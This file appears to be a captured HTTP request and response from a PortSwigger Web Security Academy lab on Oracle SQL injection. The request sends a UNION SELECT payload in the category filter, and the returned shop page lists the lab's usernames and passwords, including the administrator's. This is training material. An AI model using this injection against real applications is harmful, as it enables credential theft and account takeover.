@@ -1,0 +1,134 @@
+GET https://0a690024034a4f51821c6502002d0003.web-security-academy.net/filter?category=Pets'%20union%20select%20USERNAME_VTNTNA,PASSWORD_AORMTY%20from%20USERS_QPDTRO-- HTTP/1.1
+host: 0a690024034a4f51821c6502002d0003.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Referer: https://0a690024034a4f51821c6502002d0003.web-security-academy.net/
+Cookie: session=xXVeguTYvutbupPynUaAR4ENBwLIgOxL
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+content-length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 9399
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
+        <title>SQL injection attack, listing the database contents on Oracle</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>SQL injection attack, listing the database contents on Oracle</h2>
+                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
+                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="ecommerce">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class="ecoms-pageheader">
+                        <img src="/resources/images/shop.svg">
+                    </section>
+                    <section class="ecoms-pageheader">
+                        <h1>Pets&apos; union select USERNAME_VTNTNA,PASSWORD_AORMTY from USERS_QPDTRO--</h1>
+                    </section>
+                    <section class="search-filters">
+                        <label>Refine your search:</label>
+                        <a class="filter-category" href="/">All</a>
+                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
+                        <a class="filter-category" href="/filter?category=Gifts">Gifts</a>
+                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
+                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
+                        <a class="filter-category" href="/filter?category=Toys+%26+Games">Toys & Games</a>
+                    </section>
+                    <table class="is-table-longdescription">
+                        <tbody>
+                        <tr>
+                            <th>Giant Grasshopper</th>
+                            <td>If you are one of those anti-social people who like to sit in a corner and try not to catch anyone&apos;s eye, you probably know it doesn&apos;t always work. There will always be annoyingly cheery people who think you must be lonely and gatecrash your tranquility with mundane chit-chat.
+We breed our grasshoppers to an enormously threatening size, and train them to bite using the keyword, &apos;bite&apos;. This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.
+The grasshoppers are surprisingly easy to keep. They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.
+This particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home. Can be housed with other grasshoppers, an older quiet one could help to show it the ropes and understand the rules of the house.</td>
+                        </tr>
+                        <tr>
+                            <th>More Than Just Birdsong</th>
+                            <td>There was a time when the only decorations you would see on the wires of a wooden utility pole were socks and baseball boots; the odd colorful kite as well if you were lucky.
+We have come up with a more desirable way to liven up those ugly overhead wires. Our collection of musical notes are made from electro resistant materials ensuring they are perfectly safe even following a surge, or a lightning strike.
+What&apos;s more exciting though, is we will customize all our crotchets and quavers so you can create a real musical score. You choose the music and we will do the rest. The treble clef even has an inbuilt bird feeder to keep the birds whistling a happy tune throughout the stark winter days.
+Pleasing to the eye, as well as kind to the local wildlife, you can buy safe in the knowledge you are doing your own little bit for planet earth. Be the trendsetter you have always wanted to be, order your music without delay.</td>
+                        </tr>
+                        <tr>
+                            <th>Pest Control Umbrella</th>
+                            <td>We recently discovered, by accident, that vermin and all manner of pets and pests are attracted to umbrellas. Not to just any umbrellas though, they have to be long, pointy ones.
+It is very hard these days to get hold of an umbrella that isn&apos;t collapsible, these will not work as pest control. So, we decided to start designing and manufacturing our unique Pest Control Umbrella, the only genuine umbrella that will do the job. We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.
+Never knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.
+Easy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead. By purchasing this highly effective product you will be well on your way to starting up your own pest control business, a little investment now will pay great dividends in the future for you and your family.</td>
+                        </tr>
+                        <tr>
+                            <th>The Lazy Dog</th>
+                            <td>The Lazy Dog is brought to you by the same people who invented the wheel. Do you become frustrated when your small dog just can&apos;t keep up the pace, or stubbornly sits and gives up walking altogether? If the answer is yes, then The Lazy Dog is for you!
+As easy to fit as a harness these remote controlled owl wings are a must have for any dog lover. As soon as your pooch has taken its last step of the day just snap the wings into place and click the red &apos;flapping&apos; button on your handheld remote. After a few seconds, your furry friend will be off the ground and up, up and away.
+Once at a safe height, WARNING: BEWARE OF LOW HANGING BRANCHES, click the blue button to initiate cruise control. The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.
+Carrying your pooch has become a thing of the past. With The Lazy Dog, the dog park will become a place to enjoy again. You can also purchase an aviator hat and goggles, extra protection and peace of mind for you and your pooch.</td>
+                        </tr>
+                        <tr>
+                            <th>administrator</th>
+                            <td>fb05odma05jwc9opg6hr</td>
+                        </tr>
+                        <tr>
+                            <th>carlos</th>
+                            <td>v3c873khznxh1nn8lv8e</td>
+                        </tr>
+                        <tr>
+                            <th>wiener</th>
+                            <td>483jp47m6xlgmxzx9gd2</td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
